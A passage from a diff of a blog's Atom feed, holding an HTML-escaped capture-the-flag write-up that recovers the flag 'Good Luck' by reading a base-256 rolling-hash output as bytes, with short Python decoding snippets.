class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;*********&quot;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;RabinKarpRollingHash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;result = &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;
-
-
-&lt;span class=&quot;n&quot;&gt;RabinKarpRollingHash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;span style=&quot;color: #333333;&quot;&gt;output is
-1317748575983887541099
-What is the flag?&lt;/span&gt;&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;p&gt;Well, the point is 10**30 is a very large number and calculating the modulus has no effect on output. also 256 is a power of 2.&lt;/p&gt;
-
-&lt;p&gt;Given code calculates ASCII code for each character of input and multiplies it in 256 ** (l-i-1) that makes their bits shift (8*k) then adds all results together. So representation of &lt;span style=&quot;color: #333333;&quot;&gt;1317748575983887541099 in binary contains concatenated binary codes of flag in reverse order. 
-I used  &lt;a href=&quot;http://www.onlineconversion.com/base.htm&quot;&gt;this site&lt;/a&gt; to convert this number to binary.&lt;/span&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;chars&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b01000111&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b01101111&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b01101111&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b01100100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b00100000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b01001100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b01110100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b00000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b00000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Well, that site failed in last bits and this code outputs &lt;strong&gt;‘Good Lt’&lt;/strong&gt; but it’s very easy to guess that flag was &lt;strong&gt;Good Luck&lt;/strong&gt;&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;p&gt;&lt;strong&gt;EDIT:&lt;/strong&gt; a better solution for the last step mentioned in comments:&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;number&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1317748575983887541099&lt;/span&gt; 
-&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;number&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>mashhadimj</name></author><summary type="html">```python flag=”*****” def RabinKarpRollingHash( str, a, n ): result = 0 l = len(str) for i in range(0, l): result += ord(str[i]) * a ** (l - i - 1) % n print “result = “, result</summary></entry></feed>
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>mashhadimj</name></author><summary type="html">Given a php file as coder and an encoded file, Find the flag.</summary></entry></feed>
